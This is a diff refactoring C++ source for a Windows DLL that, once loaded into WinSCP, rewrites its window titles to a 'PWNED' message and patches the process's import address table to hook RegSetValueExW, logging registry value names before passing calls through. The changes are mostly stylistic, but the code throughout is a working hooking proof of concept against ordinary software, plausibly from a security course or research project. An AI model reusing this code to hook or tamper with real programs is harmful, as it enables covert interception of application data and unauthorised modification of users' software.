@@ -8,62 +8,53 @@
 #include <strsafe.h>
 #include <fstream>
 
-#define BUFSIZE 512
 
+#define BUFSIZE 512
 #define IMPORT_TABLE_OFFSET 1
 
-BOOL CALLBACK changeWindowCallBack(
-	_In_ HWND   hwnd,
-	_In_ LPARAM lParam
-) {
-	DWORD outputPid = NULL;
+
+BOOL CALLBACK changeWindowCallBack(const HWND hwnd, const LPARAM lParam)
+{
+	DWORD outputPid = 0;
 	GetWindowThreadProcessId(hwnd, &outputPid);
-	DWORD pidToSet = *(PDWORD(lParam));
-	if (outputPid == pidToSet) {
+	const auto pidToSet = *(PDWORD(lParam));
+	if (outputPid == pidToSet) 
+	{
 		SetWindowText(hwnd, "WinSCP is PWNED by Lidor and Neriya!");
 	}
 
 	return TRUE;
 }
 
-void changeWindowTitle() {
-	DWORD currentPid = GetCurrentProcessId();
-	EnumWindows(changeWindowCallBack, (LPARAM)&currentPid);
-}
 
-PIMAGE_IMPORT_DESCRIPTOR getImportTable(HMODULE hInstance)
+void changeWindowTitle()
 {
-	PIMAGE_DOS_HEADER dosHeader;
-	IMAGE_OPTIONAL_HEADER optionalHeader;
-	PIMAGE_NT_HEADERS ntHeader;
-	IMAGE_DATA_DIRECTORY dataDirectory;
-
-	dosHeader = (PIMAGE_DOS_HEADER)hInstance;
-	ntHeader = (PIMAGE_NT_HEADERS)((PBYTE)dosHeader + dosHeader->e_lfanew);
-    optionalHeader = (IMAGE_OPTIONAL_HEADER)(ntHeader->OptionalHeader);
-	dataDirectory = (IMAGE_DATA_DIRECTORY)(optionalHeader.DataDirectory[IMPORT_TABLE_OFFSET]);
-	return (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hInstance + dataDirectory.VirtualAddress);
+	auto currentPid = GetCurrentProcessId();
+	EnumWindows(changeWindowCallBack, reinterpret_cast<LPARAM>(&currentPid));
 }
 
 
-bool rewriteThunk(PIMAGE_THUNK_DATA pThunk, void* newFunc)
+PIMAGE_IMPORT_DESCRIPTOR getImportTable(const HMODULE hInstance)			
 {
-	DWORD CurrentProtect;
+	const auto dosHeader = reinterpret_cast<PIMAGE_DOS_HEADER>(hInstance);
+	const auto ntHeader = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<PBYTE>(dosHeader) + dosHeader->e_lfanew);
+	auto optionalHeader = static_cast<IMAGE_OPTIONAL_HEADER>(ntHeader->OptionalHeader);
+	const auto dataDirectory = static_cast<IMAGE_DATA_DIRECTORY>(optionalHeader.DataDirectory[IMPORT_TABLE_OFFSET]);
+	return reinterpret_cast<PIMAGE_IMPORT_DESCRIPTOR>(reinterpret_cast<PBYTE>(dosHeader) + dataDirectory.VirtualAddress);
+}
+
+
+bool rewriteThunk(const PIMAGE_THUNK_DATA pThunk, void* newFunc)
+{
+	DWORD currentProtect;
 	DWORD junk;
-	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &CurrentProtect);
-	pThunk->u1.Function = (DWORD)newFunc;
-	VirtualProtect(pThunk, 4096, CurrentProtect, &junk);
+	VirtualProtect(pThunk, 4096, PAGE_READWRITE, &currentProtect);
+	pThunk->u1.Function = reinterpret_cast<DWORD>(newFunc);
+	VirtualProtect(pThunk, 4096, currentProtect, &junk);
 	return true;
 }
 
-LSTATUS APIENTRY MyRegSetValueExW(
-	_In_ HKEY hKey,
-	_In_opt_ LPCWSTR lpValueName,
-	_Reserved_ DWORD Reserved,
-	_In_ DWORD dwType,
-	_In_reads_bytes_opt_(cbData) CONST BYTE * lpData,
-	_In_ DWORD cbData
-)
+LSTATUS APIENTRY myRegSetValueExW(HKEY hKey, LPCWSTR lpValueName, DWORD Reserved, DWORD dwType,	_In_reads_bytes_opt_(cbData) CONST BYTE * lpData, DWORD cbData)
 {
 	OutputDebugStringW(L"MyRegSetValueExW");
 	OutputDebugStringW(lpValueName);
@@ -80,29 +71,31 @@ LSTATUS APIENTRY MyRegSetValueExW(
 	return RegSetValueExW(hKey, lpValueName, Reserved, dwType, lpData, cbData);
 }
 
-void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
-{
-	HMODULE currentProcessImage = GetModuleHandleA(NULL);
-	PIMAGE_IMPORT_DESCRIPTOR importedModule;
-	PIMAGE_THUNK_DATA pFirstThunk, pOriginalFirstThunk;
-	PIMAGE_IMPORT_BY_NAME pFuncData;
-	importedModule = getImportTable(currentProcessImage);
-	bool doneHooking = false;
-	
-	while (*(WORD*)importedModule != 0)
-	{
-		pFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule->FirstThunk);
-		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((PBYTE)currentProcessImage + importedModule ->OriginalFirstThunk);
-		pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk ->u1.AddressOfData);
 
-		OutputDebugStringA((char*)((PBYTE)currentProcessImage + importedModule->Name));
-		if (strcmp("ADVAPI32.DLL", (char*)((PBYTE)currentProcessImage + importedModule->Name)) == 0) 
+void patchIat(char* funcNameToPatch, void* funcToRunInstead)
+{
+	const auto currentProcessImageHandle = GetModuleHandleA(nullptr);
+	const auto currentProcessImage = reinterpret_cast<PBYTE>(currentProcessImageHandle);
+	auto importedModule = getImportTable(currentProcessImageHandle);
+	auto doneHooking = false;
+	
+	while (*reinterpret_cast<PWORD>(importedModule) != 0)
+	{
+		auto pFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(currentProcessImage + importedModule->FirstThunk);
+		auto pOriginalFirstThunk = reinterpret_cast<PIMAGE_THUNK_DATA>(currentProcessImage + importedModule->OriginalFirstThunk);
+		auto pFuncData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
+
+		const auto currentModuleName = reinterpret_cast<char*>(currentProcessImage + importedModule->Name);
+		OutputDebugStringA(currentModuleName);
+		
+		if (strcmp("ADVAPI32.DLL", currentModuleName) == 0)
 		{
-			OutputDebugStringA((char*)((PBYTE)currentProcessImage + importedModule->Name));
-			while (*(WORD*)pFirstThunk != 0 && *(WORD*)pOriginalFirstThunk != 0)
+			OutputDebugStringA(currentModuleName);
+			while (*reinterpret_cast<PWORD>(pFirstThunk) != 0 && *reinterpret_cast<PWORD>(pOriginalFirstThunk) != 0)
 			{
-				OutputDebugStringA((char*)pFuncData->Name);
-				if (strcmp(funcNameToPatch, (char*)pFuncData->Name) == 0)
+				const auto currentFunction = static_cast<char*>(pFuncData->Name);
+				OutputDebugStringA(currentFunction);
+				if (strcmp(funcNameToPatch, currentFunction) == 0)
 				{
 					OutputDebugStringW(L"Hooking:");
 					OutputDebugStringA(funcNameToPatch);
@@ -115,7 +108,7 @@ void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
 				}
 
 				pOriginalFirstThunk++;
-				pFuncData = (PIMAGE_IMPORT_BY_NAME)((PBYTE)currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
+				pFuncData = reinterpret_cast<PIMAGE_IMPORT_BY_NAME>(currentProcessImage + pOriginalFirstThunk->u1.AddressOfData);
 				pFirstThunk++;
 			}
 		}
@@ -131,17 +124,15 @@ void patchIAT(char* funcNameToPatch, void* funcToRunInstead)
 	OutputDebugStringW(L"patchIAT end");
 }
 
-BOOL APIENTRY DllMain(
-    _In_ HINSTANCE hInst,
-    _In_ DWORD     reason,
-    _In_ LPVOID    reserved
-) {
+
+BOOL APIENTRY DllMain(HINSTANCE hInst, DWORD reason, LPVOID reserved)
+{	
     switch (reason) {
 		case DLL_PROCESS_ATTACH:
 	    {	    
 			OutputDebugStringW(L"DllMain");
 			changeWindowTitle();
-			patchIAT("RegSetValueExW", MyRegSetValueExW);
+			patchIat("RegSetValueExW", myRegSetValueExW);
 			OutputDebugStringW(L"IATPatching DllMain end");
 		}
 		default: ;
